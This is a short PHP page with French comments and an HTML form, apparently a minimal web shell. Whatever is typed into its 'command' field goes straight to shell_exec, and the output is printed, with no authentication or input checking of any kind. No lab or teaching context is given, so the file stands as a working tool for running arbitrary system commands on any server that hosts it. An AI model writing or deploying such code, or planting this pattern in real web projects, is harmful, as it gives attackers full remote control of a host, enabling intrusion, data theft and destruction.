<?php
// Si une commande est soumise via le formulaire, l'exécuter
if (isset($_POST['command'])) {
    $command = $_POST['command'];
    // Exécuter la commande
    $output = shell_exec($command);
    // Afficher la sortie de la commande
    echo "<pre>$output</pre>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Execute System Command</title>
</head>
<body>
    <h1>Execute a Command</h1>
    <form method="POST">
        <input type="text" name="command" placeholder="Enter command" />
        <button type="submit">Execute</button>
    </form>
</body>
</html>
